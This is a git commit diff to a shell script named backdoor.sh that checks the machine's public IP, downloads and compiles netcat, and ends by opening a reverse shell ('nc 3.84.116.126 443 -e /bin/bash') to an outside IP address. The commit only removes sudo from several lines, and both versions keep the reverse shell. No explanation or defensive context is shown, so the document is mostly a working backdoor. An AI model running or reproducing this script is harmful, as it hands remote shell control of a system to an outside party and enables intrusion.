c8a1fce1b02998e7d116ec0d3e692adee7810cdd
Magno Logan <magnologan@gmail.com>
2021-11-01 15:03:58 -0400

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 
 sudo curl -s http://whatismyip.akamai.com/
-sudo wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz
-sudo tar -xzvf netcat-0.7.1.tar.gz
-cd netcat-0.7.1
-sudo ./configure
+wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz
+tar -xzvf netcat-0.7.1.tar.gz
+cd netcat-0.7.1 
+./configure
 sudo make
 sudo make install
-sudo nc 3.84.116.126 443 -e /bin/bash
+nc 3.84.116.126 443 -e /bin/bash
